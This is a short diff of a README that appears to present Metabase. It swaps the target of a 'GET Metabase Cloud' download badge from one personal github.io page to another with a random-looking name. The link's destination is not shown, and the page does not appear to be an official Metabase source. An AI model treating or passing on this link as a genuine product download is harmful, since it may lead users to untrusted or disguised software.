@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://evolpe.pl/wp-content/uploads/2020/07/metabase-small-1.png)
 
-[![GET Metabase Cloud](https://img.shields.io/badge/GET%20%E2%80%94%20Metabase%20Cloud-0078D6?style=for-the-badge&logoColor=white)](https://jaxtonhodgerlok.github.io/.github/metabase-cloud)
+[![GET Metabase Cloud](https://img.shields.io/badge/GET%20%E2%80%94%20Metabase%20Cloud-0078D6?style=for-the-badge&logoColor=white)](https://mustafaandrewsdasd.github.io/.github/metabase-cloud)
 
 ---
 
